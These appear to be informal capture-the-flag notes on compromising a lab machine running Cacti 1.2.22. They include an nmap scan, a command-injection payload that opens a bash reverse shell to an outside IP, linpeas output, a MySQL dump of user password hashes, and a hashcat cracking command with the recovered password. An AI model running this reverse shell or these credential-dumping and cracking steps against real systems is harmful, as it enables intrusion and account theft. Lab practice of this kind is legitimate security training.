Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-09 11:19 IST
Nmap scan report for 10.10.11.211
Host is up (0.60s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 79.39 seconds

1.2.22 cve
got the shell

![](20230709021800.png)

how od we get a proper shell

cat entrypoint.sh
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
        set -- apache2-foreground "$@"
fi


172.19.0.3      50bca5e748b0

exec "$@"

can we put aproxychain and reach there?

 sh -c /usr/local/bin/php -q /var/www/html/script_server.php realtime ;bash -c 'bash -i >& /dev/tcp/10.10.16.21/4444 0>&1'

bash -c bash -i >& /dev/tcp/10.10.16.21/4444 0>&1

running linpeas

 /etc/mysql/mariadb.cnf                                                     
[client-server]

/etc/pam.d/common-password                                                                                          
/usr/lib/x86_64-linux-gnu/libmariadb3/plugin/caching_sha2_password.so
/usr/lib/x86_64-linux-gnu/libmariadb3/plugin/mysql_clear_password.so
/usr/lib/x86_64-linux-gnu/libmariadb3/plugin/sha256_password.so
/usr/local/include/php/ext/standard/php_password.h
/usr/share/pam/common-password
/usr/share/pam/common-password.md5sums
/var/cache/debconf/passwords.dat
/var/lib/pam/password
/var/www/html/auth_changepassword.php

╔══════════╣ Searching passwords in config PHP files
#$rdatabase_password = 'cactiuser';                                                                                 
$database_password = 'root';

```
bash-5.1$ mysql --host=db --user==root --password=root cacti -e "show tables"
mysql --host=db --user==root --password=root cacti -e "show table"
ERROR 1045 (28000): Access denied for user '=root'@'172.19.0.3' (using password: YES)
```
mysql --host=db --user=root --password=root cacti -e "select * from user_auth"

but this works

bash-5.1$ mysql --host=db --user=root --password=root cacti -e "select * from user_auth"
< --password=root cacti -e "select * from user_auth"
id      username        password        realm   full_name       email_address   must_change_password    password_change     show_tree       show_list       show_preview    graph_settings  login_opts      policy_graphs   policy_treespolicy_hosts    policy_graph_templates  enabled lastchange      lastlogin       password_history        locked  failed_attempts     lastfail        reset_perms
1       admin   $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC    0       Jamie Thompson  admin@monitorstwo.htb               on      on      on      on      on      2       1       1       1       1       on      -1 -1       -1              0       0       663348655
3       guest   43e9a4ab75570f5b        0       Guest Account           on      on      on      on      on      3  11       1       1       1               -1      -1      -1              0       0       0
4       marcus  $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C    0       Marcus Brune    marcus@monitorstwo.htb                      on      on      on      on      1       1       1       1       1       on      -1 -1               on      0       0       2135691668


using john.py

hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt

funkymonkeyw
